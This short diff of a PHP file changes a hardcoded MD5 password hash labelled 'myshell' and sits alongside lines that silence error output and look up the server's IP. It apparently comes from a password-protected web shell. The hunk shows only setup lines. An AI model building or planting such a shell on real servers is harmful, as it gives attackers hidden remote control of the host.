@@ -14,7 +14,7 @@ if(version_compare(PHP_VERSION, '5.3.0', '<')) {
 @ini_set('display_errors', 0);
 @error_reporting(0);
 
-$password = "248d4b6c97654f61a59b6b6370cfe33b"; #md5: myshell
+$password = "4a059aa73ede74edb46e462117887c74"; #md5: myshell
 
 $SERVERIP  = (!$_SERVER['SERVER_ADDR']) ? gethostbyname($_SERVER['HTTP_HOST']) : $_SERVER['SERVER_ADDR'];
 
